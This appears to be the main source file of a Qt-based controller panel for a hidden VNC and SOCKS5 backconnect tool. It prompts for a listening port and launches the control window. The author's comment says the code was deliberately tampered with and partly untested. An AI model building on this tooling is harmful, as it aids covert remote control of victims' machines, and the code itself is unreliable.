#include "main_controller.h"
#include "backconnect.h"
#include <QApplication>
#include <QInputDialog>
/*
 * Purposely fucked with the code ;)
 * best of luck, also BTW i only test HVNC i never tested socks5, should work through lmfao
 */
int main(int argc, char *argv[])
{

    QApplication a(argc, argv);

    QInputDialog input;
    bool status = false;
    int port = input.getInt(nullptr, "Setup Port", "Enter Listening Port:",  0, 0, 65535, 1, &status);
    if((port != 0) && status){
        qDebug("port %d\n", port);
        backconnect::listen_port = port;
        QGuiApplication::setApplicationDisplayName(main_controller::tr("Main Controller"));
        main_controller w;
        w.show();
        status = a.exec();
    }
    return status;
}
